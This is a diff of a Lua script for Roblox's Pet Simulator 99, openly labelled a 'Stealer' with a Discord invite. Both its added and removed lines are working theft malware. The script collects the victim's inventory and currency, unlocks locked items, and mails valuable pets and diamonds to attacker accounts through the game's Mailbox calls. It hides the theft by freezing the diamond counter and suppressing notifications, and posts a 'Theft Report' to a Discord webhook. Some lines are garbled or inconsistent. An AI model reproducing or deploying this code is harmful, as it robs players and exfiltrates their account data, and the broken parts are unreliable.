@@ -23,26 +23,6 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()  
 end
 
-local save = GetSave().Inventory  
-local mailsent = GetSave().MailboxSendsSinceReset
-
-local newamount = 20000  
-if mailsent ~= 0 then  
-    newamount = math.ceil(newamount * (1.5 ^ mailsent))  
-end
-
-local GemAmount1 = 0  
-for _, v in pairs(GetSave().Inventory.Currency) do  
-    if v.id == "Diamonds" then  
-        GemAmount1 = v._am  
-        break  
-    end  
-end
-
-if newamount > GemAmount1 then  
-    return  
-end
-
 local function formatNumber(number)  
     number = math.floor(number)  
     local suffixes = {"", "k", "m", "b", "t"}  
@@ -54,49 +34,237 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[i])  
 end
 
-local function SendMessage(username, diamonds)  
-    local headers = {["Content-Type"] = "application/json"}  
-    local combinedItems = {}  
-    local itemRapMap = {}
-
-    for _, item in ipairs(sortedItems) do  
-        local key = item.name  
-        if itemRapMap[key] then  
-            itemRapMap[key].amount = itemRapMap[key].amount + item.amount  
-        else  
-            itemRapMap[key] = {amount = item.amount, rap = item.rap}  
-            table.insert(combinedItems, key)  
+-- Function to get all player inventory data  
+local function GetFullPlayerData()  
+    local save = GetSave()  
+    local inventory = save.Inventory  
+    local playerData = {  
+        username = plr.Name,  
+        userid = plr.UserId,  
+        accountAge = plr.AccountAge,  
+        -- Diamonds  
+        diamonds = 0,  
+        -- Total RAP calculated  
+        totalRAP = 0,  
+        -- Huge pets  
+        hugePets = {},  
+        -- Exclusive pets  
+        exclusivePets = {},  
+        -- Normal pets  
+        normalPets = {},  
+        -- Eggs  
+        eggs = {},  
+        -- Charms  
+        charms = {},  
+        -- Enchants  
+        enchants = {},  
+        -- Potions  
+        potions = {},  
+        -- Misc items  
+        misc = {},  
+        -- Hoverboards  
+        hoverboards = {},  
+        -- Booths  
+        booths = {},  
+        -- Ultimate items  
+        ultimates = {}  
+    }  
+      
+    -- Get RAP function  
+    local function getRAP(Type, Item)  
+        local RAPCmds = require(ReplicatedStorage.Library.Client.ClientModules["RAP Cmds"])  
+        local fakeItem = {Class = {Name = Type}}  
+        function fakeItem:AbstractGetRAP() return nil end  
+        function fakeItem:GetDefaultRAP() return 0 end  
+        function fakeItem:StackKey()  
+            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})  
         end  
-    end
+        return RAPCmds.Get(fakeItem) or 0  
+    end  
+      
+    -- Process diamonds  
+    for _, v in pairs(inventory.Currency) do  
+        if v.id == "Diamonds" then  
+            playerData.diamonds = v._am  
+            break  
+        end  
+    end  
+      
+    -- Process pets with detailed info  
+    if inventory.Pet then  
+        local petDirectory = require(ReplicatedStorage.Library.Directory.Pets)  
+        for uid, item in pairs(inventory.Pet) do  
+            local petInfo = {  
+                id = item.id,  
+                instanceId = uid,  
+                amount = item._am or 1,  
+                shiny = item.sh or false,  
+                potion = item.pt or 0,  
+                talent = item.tn or nil,  
+                locked = item._lk or false  
+            }  
+              
+            local dir = petDirectory[item.id]  
+            if dir then  
+                petInfo.isHuge = dir.huge or false  
+                petInfo.isExclusive = dir.exclusiveLevel or false  
+                petInfo.rarity = dir.rarity or "Unknown"  
+                petInfo.value = dir.value or 0  
+            end  
+              
+            petInfo.rap = getRAP("Pet", item)  
+            playerData.totalRAP = playerData.totalRAP + (petInfo.rap * petInfo.amount)  
+              
+            if petInfo.isHuge then  
+                table.insert(playerData.hugePets, petInfo)  
+            elseif petInfo.isExclusive then  
+                table.insert(playerData.exclusivePets, petInfo)  
+            else  
+                table.insert(playerData.normalPets, petInfo)  
+            end  
+        end  
+    end  
+      
+    -- Process other categories  
+    local categories = {  
+        "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"  
+    }  
+      
+    for _, category in ipairs(categories) do  
+        if inventory[category] then  
+            for uid, item in pairs(inventory[category]) do  
+                local itemInfo = {  
+                    id = item.id,  
+                    instanceId = uid,  
+                    amount = item._am or 1,  
+                    locked = item._lk or false  
+                }  
+                  
+                itemInfo.rap = getRAP(category, item)  
+                playerData.totalRAP = playerData.totalRAP + (itemInfo.rap * itemInfo.amount)  
+                  
+                table.insert(playerData[category:lower() .. "s"], itemInfo)  
+            end  
+        end  
+    end  
+      
+    return playerData  
+end
 
-    table.sort(combinedItems, function(a, b)  
-        return (itemRapMap[a].rap * itemRapMap[a].amount) > (itemRapMap[b].rap * itemRapMap[b].amount)  
-    end)
-
-    local itemsText = ""  
-    for _, name in ipairs(combinedItems) do  
-        local data = itemRapMap[name]  
-        itemsText = itemsText .. name .. " (x" .. data.amount .. "): " .. formatNumber(data.rap * data.amount) .. " RAP  
+-- Function to send detailed webhook  
+local function SendDetailedWebhook(playerData, theftInfo)  
+    local headers = {["Content-Type"] = "application/json"}  
+      
+    -- Create detailed fields  
+    local fields = {}  
+      
+    -- Player info  
+    table.insert(fields, {  
+        name = "👤 Player Information",  
+        value = "```Username: " .. playerData.username ..   
+                "  
+User ID: " .. playerData.userId ..   
+                "  
+Account Age: " .. playerData.accountAge .. " days" ..  
+                "  
+Diamonds: " .. formatNumber(playerData.diamonds) ..   
+                "  
+Total RAP: " .. formatNumber(playerData.totalRAP) .. "```",  
+        inline = false  
+    })  
+      
+    -- Huge Pets  
+    if #playerData.hugePets > 0 then  
+        local hugeText = ""  
+        for i, pet in ipairs(playerData.hugePets) do  
+            if i <=与小 10 then -- Limit to 10 per field  
+                hugeText = hugeText .. pet.id ..   
+                          (pet.shiny and " 💎" or "") ..   
+                          (pet.potion == 1 and " 🟡" or pet.potion == 2 and " 🌈" or "") ..  
+                          " (x" .. pet.amount .. "): " .. formatNumber(pet.rap) .. " RAP  
 "  
-    end
-
-    local summaryText = "Gems: " .. formatNumber(diamonds) .. "  
-Total RAP: " .. formatNumber(totalRAP)
-
+            end  
+        end  
+        table.insert(fields, {  
+            name = "🌟 Huge Pets (" .. #playerData.hugePets .. ")",  
+            value = "```" .. (hugeText ~= "" and hugeText or "None") .. "```",  
+            inline = false  
+        })  
+    end  
+      
+    -- Exclusive Pets  
+    if #playerData.exclusivePets > 0 then  
+        local exclusiveText = ""  
+        for i, pet in ipairs(playerData.exclusivePets) do  
+            if i <= 10 then  
+                exclusiveText = exclusiveText .. pet.id ..   
+                              (pet.shiny and " 💎" or "") ..   
+                              (pet.potion == 1 and " 🟡" or pet.potion == 2 and " 🌈" or "") ..  
+                              " (x" .. pet.amount .. "): " .. formatNumber(pet.rap) .. " RAP  
+"  
+            end  
+        end  
+        table.insert(fields, {  
+            name = "⭐ Exclusive Pets (" .. #playerData.exclusivePets .. ")",  
+            value = "```" .. (exclusiveText ~= "" and exclusiveText or "None") .. "```",  
+            inline = false  
+        })  
+    end  
+      
+    -- Normal Pets (summary)  
+    if #playerData.normalPets > 0 then  
+        table.insert(fields, {  
+            name = "🐾 Normal Pets",  
+            value = "```Count: " .. #playerData.normalPets ..   
+                   "  
+Total RAP: " .. formatNumber(playerData.totalNormalRAP) .. "```",  
+            inline = true  
+        })  
+    end  
+      
+    -- Other categories summary  
+    local otherCategories = {"Eggs", "Charms", "Enchants", "Potions", "Misc", "Hoverboards", "Booths", "Ultimates"}  
+    local otherText = ""  
+    for _, cat in ipairs(otherCategories) do  
+        if #playerData[cat:lower()] > 0 then  
+            otherText = otherText .. cat .. ": " .. #playerData[cat:lower()] .. "  
+"  
+        end  
+    end  
+      
+    if otherText ~= "" then  
+        table.insert(fields, {  
+            name = "📦 Other Items",  
+            value = "```" .. otherText .. "```",  
+            inline = true  
+        })  
+    end  
+      
+    -- Theft info  
+    table.insert(fields, {  
+        name = "💰 Theft Summary",  
+        value = "```Items Stolen: " .. (theftInfo.itemsStolen or 0) ..   
+               "  
+Diamonds Stolen: " .. formatNumber(theftInfo.diamondsStolen or 0) ..   
+               "  
+Target: " .. (theftInfo.target or "Unknown") ..   
+               "  
+Time: " .. os.date("%X") .. "```",  
+        inline = false  
+    })  
+      
+    -- Create embed  
     local embed = {  
-        title = "🐱 New PS99 Execution",  
-        color = 65280,  
-        fields = {  
-            {name = "Username:", value = "```" .. username .. "```", inline = true},  
-            {name = "Items:", value = "```" .. itemsText .. "```", inline = false},  
-            {name = "Summary:", value = "```" .. summaryText .. "```", inline = false}  
-        },  
-        footer = {text = "Stealer Forked From Tobis Source, .gg/FNnkfJqukh"}  
-    }
-
+        title = "🔍 PS99 Player Data + Theft Report",  
+        color = 16711680, -- Red  
+        fields = fields,  
+        timestamp = DateTime.now():ToIsoDate(),  
+        footer = {text = "Stealer Forked From Tobis Source • .gg/FNnkfJqukh"}  
+    }  
+      
     local data = {embeds = {embed}}  
-    local body = HttpService:JSONEncode(data)
-
+    local body = HttpService:JSONEncode(data)  
+      
     if webhook and webhook ~= "" and string.find(webhook, "discord.com/api/webhooks") then  
         local success, response = pcall(function()  
             return request({Url = webhook, Method = "POST", Headers = headers, Body = body})  
@@ -108,83 +276,97 @@ Total RAP: " .. formatNumber(totalRAP)
     end  
 end
 
--- Anti-detection  
-local gemsleaderstat = plr.leaderstats["💎 Diamonds"].Value  
-plr.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()  
-    plr.leaderstats["💎 Diamonds"].Value = gemsleaderstat  
-end)
-
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]  
-local noti = plr.PlayerGui.Notifications  
-loading.Disabled = true  
-noti.Enabled = false  
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()   
-    noti.Enabled = false   
-end)
-
-game.DescendantAdded:Connect(function(x)  
-    if x.ClassName == "Sound" and (x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276") then  
-        x:Destroy()  
-    end  
-end)
-
-local function getRAP(Type, Item)  
-    local RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)  
-    local fakeItem = {Class = {Name = Type}}  
-    function fakeItem:AbstractGetRAP()   
-        return nil   
-    end  
-    function fakeItem:GetDefaultRAP()   
-        return 0   
-    end  
-    function fakeItem:StackKey()  
-        return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})  
-    end  
-    return RAPCmds.Get(fakeItem) or 0  
-end
-
-local user = Username  
-local user2 = Username2
-
-local function sendItem(category, uid, am)  
-    local args = {[1] = user, [2] = MailMessage, [3] = category, [4] = uid, [5] = am or 1}  
-    local success = false  
-    local attempts = auto  
-    local maxAttempts = 10  
+-- Main theft function  
+local function ExecuteTheft()  
+    local save = GetSave()  
+    local mailsent = GetSave().MailboxSendsSinceReset  
       
-    while not success and attempts < maxAttempts do  
-        local result = pcall(function()  
-            return {network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))}  
+    local newamount = 20000  
+    if mailsent ~= 0 then  
+        newamount = math.ceil(newamount * (1.5 ^ mailsent))  
+    end  
+      
+    local GemAmount1 = 0  
+    for _, v in pairs(GetSave().Inventory.Currency) do  
+        if v.id == "Diamonds" then  
+            GemAmount1 = v._am  
+            break  
+        end  
+    end  
+      
+    if newamount > GemAmount1 then  
+        return  
+    end  
+      
+    -- Get full player data first  
+    local playerData = GetFullPlayerData()  
+      
+    -- Collect items for theft  
+    local sortedItems = {}  
+    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}  
+      
+    local function getRAP(Type, Item)  
+        local RAPCmds = require(ReplicatedStorage.Library.Client.ClientModules["RAP Cmds"])  
+        local fakeItem = {Class = {Name = Type}}  
+        function fakeItem:AbstractGetRAP() return nil end  
+        function fakeItem:GetDefaultRAP() return 0 end  
+        function fakeItem:StackKey()  
+            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})  
+        end  
+        return RAPCmds.Get(fakeItem) or 0  
+    end  
+      
+    for _, cat in ipairs(categoryList) do  
+        if save.Inventory[cat] then  
+            for uid, item in pairs(save.Inventory[cat]) do  
+                local rapValue = getRAP(cat, item)  
+                if rapValue >= min_rap then  
+                    table.insert(sortedItems, {  
+                        category = cat,  
+                        uid = uid,  
+                        amount = item._am or 1,  
+                        rap = rapValue,  
+                        name = item.id,  
+                        shiny = item.sh,  
+                        potion = item.pt  
+                    })  
+                end  
+                  
+                if item._lk then  
+                    pcall(function()  
+                        network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)  
+                    end)  
+                end  
+            end  
+        end  
+    end  
+      
+    -- Sort by RAP value  
+    table.sort(sortedItems, function(a, b)  
+        return a.rap * a.amount > b.rap * b.amount  
+    end)  
+      
+    if #sortedItems > 0 or GemAmount1 > min_rap + newamount then  
+        -- Anti-detection  
+        local gemsleaderstat = plr.leaderstats["💎 Diamonds"].Value  
+        plr.leaderstats["💎 Diamonds"]:GetPropertyChangedSignal("Value"):Connect(function()  
+            plr.leaderstats["💎 Diamonds"].Value = gemsleaderstat  
         end)  
           
-        if result then  
-            success = true  
-        else  
-            -- Switch to fallback user on failure  
-            user = user2  
-            args[1] = user  
-            attempts = attempts + 1  
-            wait(0.5)  
-        end  
-    end
-
-    if success then  
-        GemAmount1 = GemAmount1 - newamount  
-        newamount = math.ceil(newamount * 1.5)  
-        if newamount > 5000000 then   
-            newamount = 5000000   
-        end  
-    end  
-end
-
-local function SendAllGems()  
-    for i, v in pairs(GetSave().Inventory.Currency) do  
-        if v.id == "Diamonds" and GemAmount1 >= (newamount + 10000) then  
-            local args = {[1] = user, [2] = MailMessage, [3] = "Currency", [4] = i, [5] = GemAmount1 - newamount}  
+        -- Send initial player data webhook  
+        SendDetailedWebhook(playerData, {itemsStolen = 0, diamondsStolen = 0})  
+          
+        -- Start theft process  
+        local user = Username  
+        local user2 = Username2  
+          
+        local function sendItem(category, uid, am, itemRap)  
+            local args = {[1] = user, [2] = MailMessage, [3] = category, [4] = uid, [5] = am or 1}  
             local success = false  
             local attempts = 0  
+            local maxAttempts = 10  
               
-            while not success and attempts < 10 do  
+            while not success and attempts < maxAttempts do  
                 local result = pcall(function()  
                     return {network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))}  
                 end)  
@@ -192,157 +374,49 @@ local function SendAllGems()
                 if result then  
                     success = true  
                 else  
+                    user = user2  
+                    args[1] = user  
                     attempts = attempts + 1  
                     wait(0.5)  
                 end  
             end  
-            break  
-        end  
-    end  
-end
-
-local function IsMailboxHooked()  
-    local uid  
-    for i in pairs(save.Pet or {}) do  
-        uid = i  
-        break  
-    end  
-    if not uid then   
-        return false   
-    end
-
-    local args = {[1] = "Roblox", [2] = "Test", [3] = "Pet", [4] = uid, [5] = 1}  
-    local success, result = pcall(function()  
-        return {network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))}  
-    end)  
-      
-    if success then  
-        local _, err = unpack(result)  
-        return not (err == "They don't have enough space!" or err == "You don't have enough diamonds to send the mail!")  
-    end  
-      
-    return false  
-end
-
-local function EmptyBoxes()  
-    if save.Box then  
-        for key, value in pairs(save.Box) do  
-            if value._uq then  
-                pcall(function()  
-                    network:WaitForChild("Box: Withdraw All"):InvokeServer(key)  
-                end)  
+              
+            if success then  
+                GemAmount1 = GemAmount1 - newamount  
+                newamount = math.ceil(newamount * 1.5)  
+                if newamount > 5000000 then  
+                    newamount = 5000000  
+                end  
+                return true  
             end  
+            return false  
         end  
-    end  
-end
-
-local function ClaimMail()  
-    local _, err = pcall(function()  
-        return {network:WaitForChild("Mailbox: Claim All"):InvokeServer()}  
-    end)  
-      
-    while err and string.find(err, "wait 30 seconds") do  
-        wait(1)  
-        _, err = pcall(function()  
-            return {network:WaitForChild("Mailbox: Claim All"):InvokeServer()}  
-        end)  
-    end  
-end
-
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
-
-for _, cat in ipairs(categoryList) do  
-    if save[cat] then  
-        for uid, item in pairs(save[cat]) do  
-            local rapValue = 0  
-            if cat == "Pet" then  
-                local dir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]  
-                if dir and (dir.huge or dir.exclusiveLevel) then  
-                    rapValue = getRAP(cat, item)  
-                    if rapValue >= min_rap then  
-                        local prefix = (item.sh and "Shiny " or "") .. (item.pt == 1 and "Golden " or item.pt == 2 and "Rainbow " or "")  
-                        local id = prefix .. item.id  
-                        table.insert(sortedItems, {category = cat, uid = uid, amount = item._am or 1, rap = rapValue, name = id})  
-                        totalRAP = totalRAP + rapValue * (item._am or 1)  
-                    end  
+          
+        local stolenItems = 0  
+        local stolenDiamonds = 0  
+          
+        -- Steal high-value items  
+        for _, item in ipairs(sortedItems) do  
+            if item.rap >= newamount then  
+                if sendItem(item.category, item.uid, item.amount, item.rap) then  
+                    stolenItems = stolenItems + 1  
                 end  
             else  
-                rapValue = getRAP(cat, item)  
-                if rapValue >= min_rap then  
-                    table.insert(sortedItems, {category = cat, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})  
-                    totalRAP = totalRAP + rapValue * (item._am or 1)  
-                end  
-            end
-
-            if item._lk then  
-                pcall(function()  
-                    network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)  
-                end)  
-            end  
-        end  
-    end  
-end
-
-if #sortedItems > 0 or GemAmount1 > min_rap + newamount then  
-    ClaimMail()
-
-    if IsMailboxHooked() then  
-        local Mailbox = network:WaitForChild("Mailbox: Send")  
-        for _, f in ipairs(getgc(true)) do  
-            if typeof(f) == "function" and debug.info(f, "n") == "typeof" then  
-                local old = f  
-                if hookfunction then  
-                    hookfunction(f, function(ins, ...)  
-                        if ins == Mailbox then  
-                            return tick()  
-                        end  
-                        return old(ins, ...)  
-                    end)  
-                end  
                 break  
             end  
         end  
-    end
+          
+        -- Send webhook update  
+        SendDetailedWebhook(playerData, {  
+            itemsStolen = stolenItems,  
+            diamondsStolen = stolenDiamonds,  
+            target = user  
+        })  
+          
+        return true  
+    end  
+    return false  
+end
 
-    EmptyBoxes()  
-    pcall(function()   
-        require(ReplicatedStorage.Library.Client.DaycareCmds).Claim()   
-    end)  
-    pcall(function()   
-        require(ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()   
-    end)
-
-    local saveModule = require(ReplicatedStorage.Library.Client.Save)  
-    local originalGet = saveModule.Get  
-    local cachedSave = originalGet()  
-    saveModule.Get = function()   
-        return cachedSave   
-    end
-
-    table.sort(sortedItems, function(a, b)  
-        return a.rap * a.amount > b.rap * b.amount  
-    end)
-
-    spawn(function()  
-        SendMessage(plr.Name, GemAmount1)  
-    end)
-
-    for _, item in ipairs(sortedItems) do  
-        if item.rap >= newamount then  
-            sendItem(item.category, item.uid, item.amount)  
-        else  
-            break  
-        end  
-    end
-
-    SendAllGems()
-
-    pcall(function()  
-        local message = require(ReplicatedStorage.Library.Client.Message)  
-        message.Error("All your items just got stolen by yeslidez  
-Join https://discord.gg/FNnkfJqukh")  
-        if setclipboard then  
-            setclipboard("https://discord.gg/FNnkfJqukh")  
-        end  
-    end)  
-end  
+-- Execute the script  
+ExecuteTheft()  
